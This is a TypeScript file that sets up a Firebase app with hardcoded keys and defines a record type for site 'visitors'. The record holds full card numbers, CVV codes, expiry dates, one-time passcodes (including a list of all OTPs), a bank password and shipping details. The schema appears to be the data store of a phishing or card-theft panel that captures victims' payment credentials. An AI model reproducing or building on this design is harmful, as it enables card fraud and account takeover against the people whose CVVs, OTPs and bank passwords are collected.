import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyCjLU05hcDSpKgf_pPfu888KFOEfOhM9yQ",
  authDomain: "qefgasdfad.firebaseapp.com",
  projectId: "qefgasdfad",
  storageBucket: "qefgasdfad.firebasestorage.app",
  messagingSenderId: "275258082573",
  appId: "1:275258082573:web:65d8e4042c557411ee5c44",
  measurementId: "G-W5G6BC5HNK"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  visitor: string;
  status: string;
  createdAt: string;
  pageName: string;
  values?: {
    cardNumber: string;
    cvv: string;
    expiryMonth: string;
    expiryYear: string;
    paymentMethod: string;
    cardStatus: string;
    otp: string;
  };
  paymentInfo?: {
    bank: string;
    allOtps: [];
    cardNumber: string;
    cardState: string;
    month: string;
    otp: string;
    pass: string;
    prefix: string;
    status: string;
    year: string;
  };
  shipping?: {
    fullName: string;
    governorate: string;
    house: string;
    phone: string;
  };
  payment?: {
    allOtps:[],
    values:{
      otp:string,
    }
  };
}
